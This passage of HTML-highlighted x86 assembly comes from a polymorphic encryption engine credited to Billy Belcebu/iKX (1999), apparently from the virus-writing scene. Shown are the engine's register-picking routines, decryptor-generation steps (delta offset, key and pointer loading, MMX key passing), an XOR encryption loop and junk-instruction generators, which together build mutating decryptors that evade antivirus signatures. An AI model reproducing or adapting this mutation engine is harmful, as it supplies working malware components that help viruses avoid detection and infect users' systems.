    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@mmx_key</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc3">"EXMM"</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">@@uninit_mmxe</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@ptr_buffer</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">esp.RETURN_ADDRESS.PUSHAD_ECX</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; --- Who made this? Ehrm... oh, it was me! :)</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc3">"[- (c) 1999 Billy Belcebu/iKX -]"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc1">; --- Useful subroutines used by the engine</span><span class="sc0">

</span><span class="sc5">@@get_register</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_key</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_ptr2data</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_counter</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_delta</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">@@gr_get_another</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">r_range</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">_ESP</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@gr_get_another</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@gr_get_another</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@gr_get_another</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@gr_get_another</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@gr_get_another</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_mask</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@gr_get_another</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">@@get_mmx_register</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@mmx_ptr2data</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@mmx_key</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">@@gmmxr_get_another</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">r_range</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@gmmxr_get_another</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@gmmxr_get_another</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">@@clear_mask</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_mask</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">@@is_register</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_key</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@is_used</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_ptr2data</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@is_used</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_counter</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@is_used</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_delta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@is_used</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_mask</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@is_used</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">@@is_used</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">stc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">@@gen_before_loop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">r_range</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; 0</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@try_deltaoffset</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; 1</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@try_loadsize</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; 2</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@try_loadpointer</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; 3</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@try_loadkey</span><span class="sc0">                   </span><span class="sc1">; 4</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@try_passkey2mmx</span><span class="sc0">               </span><span class="sc1">; 5</span><span class="sc0">

</span><span class="sc5">@@try_deltaoffset</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">bt</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@flags</span><span class="sc4">],</span><span class="sc5">@DELTAOFFSET</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">@@gen_before_loop</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_deltaoffset</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">@@try_loadsize</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">bt</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@flags</span><span class="sc4">],</span><span class="sc5">@LOADSIZE</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">@@gen_before_loop</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_loadsize</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">@@try_loadpointer</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">bt</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@flags</span><span class="sc4">],</span><span class="sc5">@LOADPOINTER</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">@@gen_before_loop</span><span class="sc0">
    </span><span class="sc6">bt</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@flags</span><span class="sc4">],</span><span class="sc5">@DELTAOFFSET</span><span class="sc0">
    </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">@@gen_before_loop</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_loadpointer</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">@@try_loadkey</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">bt</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@flags</span><span class="sc4">],</span><span class="sc5">@LOADKEY</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">@@gen_before_loop</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_loadkey</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">@@try_passkey2mmx</span><span class="sc4">:</span><span class="sc0">       
    </span><span class="sc6">bt</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@flags</span><span class="sc4">],</span><span class="sc5">@PASSKEY2MMX</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">@@gen_before_loop</span><span class="sc0">        
    </span><span class="sc6">bt</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@flags</span><span class="sc4">],</span><span class="sc5">@LOADKEY</span><span class="sc0">
    </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">@@gen_before_loop</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_passkey2mmx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">@@gen_before_loop_non_mmx</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">r_range</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; 0</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@try_deltaoffset_non_mmx</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; 1</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@try_loadsize_non_mmx</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; 2</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@try_loadpointer_non_mmx</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@try_loadkey_non_mmx</span><span class="sc0">

</span><span class="sc5">@@try_deltaoffset_non_mmx</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">bt</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@flags</span><span class="sc4">],</span><span class="sc5">@DELTAOFFSET</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">@@gen_before_loop</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_deltaoffset</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">@@try_loadsize_non_mmx</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">bt</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@flags</span><span class="sc4">],</span><span class="sc5">@LOADSIZE</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">@@gen_before_loop</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_loadsize</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">@@try_loadpointer_non_mmx</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">bt</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@flags</span><span class="sc4">],</span><span class="sc5">@LOADPOINTER</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">@@gen_before_loop</span><span class="sc0">
    </span><span class="sc6">bt</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@flags</span><span class="sc4">],</span><span class="sc5">@DELTAOFFSET</span><span class="sc0">
    </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">@@gen_before_loop</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_loadpointer</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">@@try_loadkey_non_mmx</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">bt</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@flags</span><span class="sc4">],</span><span class="sc5">@LOADKEY</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">@@gen_before_loop</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_loadkey</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">@@crypt_data</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@size2cryptd4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@enc_key</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@ptr_data2enc</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc5">@@cl00p</span><span class="sc4">:</span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">@@cl00p</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; --- Garbage generators</span><span class="sc0">

</span><span class="sc5">@@gen_garbage</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@recursion</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@recursion</span><span class="sc4">],</span><span class="sc5">RECURSION</span><span class="sc0">
    </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">@@gg_exit</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@init_mmx?</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">@@gg_mmx</span><span class="sc0">
</span><span class="sc5">@@gg_non_mmx</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">@@non_mmx_gbg</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@gg_doit</span><span class="sc0">
</span><span class="sc5">@@gg_mmx</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">@@s_gbgtbl</span><span class="sc0">
</span><span class="sc5">@@gg_doit</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">r_range</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@gbgtbl</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">@@gg_exit</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@recursion</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">@@gen_some_garbage</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">nGARBAGE</span><span class="sc0">
</span><span class="sc5">@@gsg_l00p</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_garbage</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">@@gsg_l00p</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; Generates any arithmetic operation with a register with another one register:</span><span class="sc0">
</span><span class="sc1">; ADD/OR/ADC/SBB/AND/SUB/XOR/CMP REG32,REG32</span><span class="sc0">

</span><span class="sc5">@@gen_arithmetic_reg32_reg32</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00111000b</span><span class="sc0">            </span><span class="sc1">; [ADD,OR,ADC,SBB,AND,SUB,XOR,CMP]</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00000011b</span><span class="sc0">            
    </span><span class="sc6">stosb</span><span class="sc0">

</span><span class="sc5">@@gar32r32</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@get_register</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@gar32r32</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">11000000b</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00000111b</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0"> 

</span><span class="sc1">; Generates any arithmetic operation with an immediate with a 32bit register:</span><span class="sc0">
</span><span class="sc1">; ADD/OR/ADC/SBB/AND/SUB/XOR/CMP REG32,IMM32</span><span class="sc0">

</span><span class="sc5">@@gen_arithmetic_reg32_imm32</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">81h</span><span class="sc0">                  </span><span class="sc1">; [ADD,OR,ADC,SBB,AND,SUB,XOR,CMP]</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc5">@@gar32i32</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@get_register</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@gar32i32</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">       
    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00111000b</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">11000000b</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
